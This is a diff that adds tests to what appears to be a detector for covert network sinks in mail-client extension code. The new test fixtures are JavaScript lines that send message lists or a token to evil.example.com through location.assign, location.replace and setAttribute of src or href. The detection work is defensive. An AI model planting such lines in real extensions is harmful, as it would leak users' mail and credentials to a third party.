@@ -423,6 +423,36 @@ test("a location.href navigation carrying a data-API call is covert and data-bea
   assert.equal(plain.carriesData, false);
 });
 
+// location.assign and location.replace navigate like an href assignment, so they are the
+// same covert channel. Object.assign is not a navigation.
+test("location.assign and location.replace are covert navigations", () => {
+  for (const code of [
+    'location.assign("https://evil.example.com/?d=" + messenger.messages.list(id));',
+    'window.location.replace("https://evil.example.com/?d=" + messenger.messages.list(id));',
+  ]) {
+    const hit = one(code);
+    assert.equal(hit.type, "navigation", code);
+    assert.equal(hit.channel, OVERTNESS.COVERT, code);
+    assert.equal(hit.destClass, URL_CLASS.REMOTE, code);
+    assert.equal(hit.carriesData, true, code);
+  }
+  assert.equal(scanNetworkSinks("Object.assign(a, b);").hits.length, 0);
+});
+
+// A URL set through setAttribute("src"|"href") loads like an assigned .src, so it is a
+// covert sink that can carry data in the URL.
+test("setAttribute of a src or href is a covert sink", () => {
+  for (const attr of ["src", "href"]) {
+    const hit = one(
+      `img.setAttribute("${attr}", "https://evil.example.com/p?d=" + token);`
+    );
+    assert.equal(hit.type, "set-attribute", attr);
+    assert.equal(hit.channel, OVERTNESS.COVERT, attr);
+    assert.equal(hit.destClass, URL_CLASS.REMOTE, attr);
+    assert.equal(hit.dataAppended, true, attr);
+  }
+});
+
 // Each sink records the destination AS WRITTEN, so a report can say where the data
 // goes without the reviewer opening the file. Nothing is resolved: an identifier or
 // a concatenation is quoted exactly as the developer typed it, because what was
